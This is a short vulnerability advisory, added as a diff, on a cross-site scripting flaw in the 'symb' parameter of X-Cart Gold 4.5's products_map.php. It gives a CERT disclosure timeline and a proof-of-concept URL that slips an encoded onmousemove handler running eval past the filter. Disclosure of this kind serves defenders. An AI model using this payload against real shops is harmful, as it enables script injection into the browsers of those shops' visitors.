@@ -1,0 +1,21 @@
+######################################################################################
+# Exploit Title: X-Cart Gold 4.5 (products_map.php symb parameter) XSS Vulnerability
+# Date: Jul 21 2012
+# Author: muts
+# Version: X-Cart Gold 4.5
+# Vendor URL: http://www.x-cart.com/
+######################################################################################
+
+X-Cart Gold implements a degree of XSS filtering but it is incomplete.
+The "symb" parameter of "products_map.php" is vulnerable to XSS and can be bypassed by using
+HTML anchor methods and URL encoding.
+
+Timeline:
+
+29 May 2012: Vulnerability reported to CERT
+30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
+21 Jul 2012: Public Disclosure
+
+PoC:
+
+http://victim/xcart/products_map?symb=%22%20onmousemove=javascript:eval%28unescape%28%26quot%3balert%28%22xss%22%29%3B%26quot%3B%29%29%3EAAAAAA
